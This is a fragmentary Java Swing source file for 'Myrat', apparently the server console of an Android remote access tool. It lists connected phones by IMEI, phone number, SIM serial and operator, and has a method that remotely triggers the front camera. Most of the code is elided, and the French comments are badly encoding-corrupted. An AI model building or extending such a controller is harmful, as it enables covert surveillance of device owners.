...
public class GUI extends javax.swing.JFrame {
    ...
    public GUI(Server server, int port) {
        ...
        logPanel.append(Color.blue, "*** Myrat SERVEUR ***\n" +
        ...
        this.setTitle(BUNDLE.getString("GUI.this.title")); //$NON-NLS-1$
    ...
    public void logErrTxt(String txt) {
    	...
    	FileUtils.getInfoBylogShow("file",(new Date(System.currentTimeMillis())+ " "+txt+"\n"));
    }
    ...
    private void buttonAboutActionPerformed() {
    	JOptionPane.showMessageDialog(this,"Myrat is a free application developped in Java language.\n" +
    			"Autors : A.Bertrand, R.David, A.Akimov & P.Junk\n" +
    			"It is under the GNU GPL3 Licence","About Myrat",JOptionPane.INFORMATION_MESSAGE,
    ...
    // *******************************
    //	M锟絫hodes de modif du tableau
    // *******************************

    /**
     * Ajoute une ligne "client" dans le tableau des clients connect茅s
     * @param imei L'identifiant t锟絣锟絧hone
     * @param countryCode Le code du pays o锟�se trouve l'appareil
     * @param telNumber Le numero de t锟絣锟絧hone (si disponible) de l'appareil
     * @param simCountryCode Le pays d'enregitrement de la SIM
     * @param simSerial Le s锟絩ial de la SIM
     * @param operator L'op锟絩ateur o锟�se trouve l'appareil
     * @param simOperator L'op锟絩ateur de la carte SIM
     */
    /*
    ...
    /**
     * Enl锟絭e de la table des clients, le client mis en param锟絫re
     * @param imei L'identifiant du client 锟�supprimer
     */
    ...
    /**
     * M锟絫hode appel锟絜 par les UserGUI lors de leur fermeture afin de supprimer la r锟絝锟絩ence dans la HashMap
    ...
    public void fireTakePicture_front(String imei) {
    	server.commandSender(imei, Protocol.GET_PICTURE_FRONT, null);
    }
    ...
    /**
     * Fonction g锟絥锟絩ant les 锟絣锟絤ents SWING de l'interface graphique
     * NE PAS TOUCHER !!
     */
    private void initComponents() {
        ...
        buttonAbout.setText(BUNDLE.getString("AboutMyrat")); //$NON-NLS-1$
